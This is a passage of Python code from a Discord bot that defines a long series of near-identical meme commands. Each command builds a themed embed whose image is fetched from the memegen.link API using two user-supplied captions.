    @React.command(usage="snek <Text 1> <Text 2>", description="Skeptical Snake")
    async def snek(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Skeptical Snake""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/snek/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="soa <Text 1> <Text 2>", description="Seal of Approval")
    async def soa(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Seal of Approval""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/soa/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sohappy <Text 1> <Text 2>", description="I Would Be So Happy")
    async def sohappy(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Would Be So Happy""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sohappy/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sohot <Text 1> <Text 2>", description="So Hot Right Now")
    async def sohot(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""So Hot Right Now""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sohot/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="soupnazi <Text 1> <Text 2>", description="No Soup for You / Soup Nazi")
    async def soupnazi(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""No Soup for You / Soup Nazi""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/soup-nazi/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sparta <Text 1> <Text 2>", description="This is Sparta!")
    async def sparta(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""This is Sparta!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sparta/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="spiderman <Text 1> <Text 2>", description="Spiderman pointing at Spiderman meme")
    async def spiderman(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Spider-Man Pointing at Spider-Man""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/spiderman/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="spongebob <Text 1> <Text 2>", description="Mocking Spongebob")
    async def spongebob(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Mocking Spongebob""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/spongebob/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ss <Text 1> <Text 2>", description="Scumbag Steve")
    async def ss(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Scumbag Steve""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ss/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="stew <Text 1> <Text 2>", description="Baby, You've Got a Stew Going")
    async def stew(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Baby, You've Got a Stew Going""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/stew/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="stopit <Text 1> <Text 2>", description="Stop It, Get Some Help")
    async def stopit(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Stop It, Get Some Help""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/stop-it/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="success <Text 1> <Text 2>", description="Success Kid")
    async def success(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Success Kid""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/success/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="tenguy <Text 1> <Text 2>", description="10 Guy")
    async def tenguy(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""10 Guy""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/tenguy/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="toohigh <Text 1> <Text 2>", description="The Rent Is Too Damn High")
    async def toohigh(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""The Rent Is Too Damn High""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/toohigh/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="tried <Text 1> <Text 2>", description="At Least You Tried")
    async def tried(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""At Least You Tried""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/tried/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="trump <Text 1> <Text 2>", description="Donald Trump")
    async def trump(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Donald Trump""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/trump/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ugandanknuck <Text 1> <Text 2>", description="Ugandan Knuckles")
    async def ugandanknuck(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Ugandan Knuckles""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ugandanknuck/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="whatyear <Text 1> <Text 2>", description="What Year Is It?")
    async def whatyear(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""What Year Is It?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/whatyear/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="winter <Text 1> <Text 2>", description="Winter is coming")
    async def winter(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Winter is coming""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/winter/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="wkh <Text 1> <Text 2>", description="Who Killed Hannibal?")
    async def wkh(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Who Killed Hannibal?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/wkh/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="wonka <Text 1> <Text 2>", description="Condescending Wonka")
    async def wonka(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Condescending Wonka""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/wonka/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="xy <Text 1> <Text 2>", description="X all the Y")
    async def xy(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""X all the Y""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/xy/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="yallgot <Text 1> <Text 2>", description="Y'all Got Any More of Them")
    async def yallgot(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Y'all Got Any More of Them""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/yallgot/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
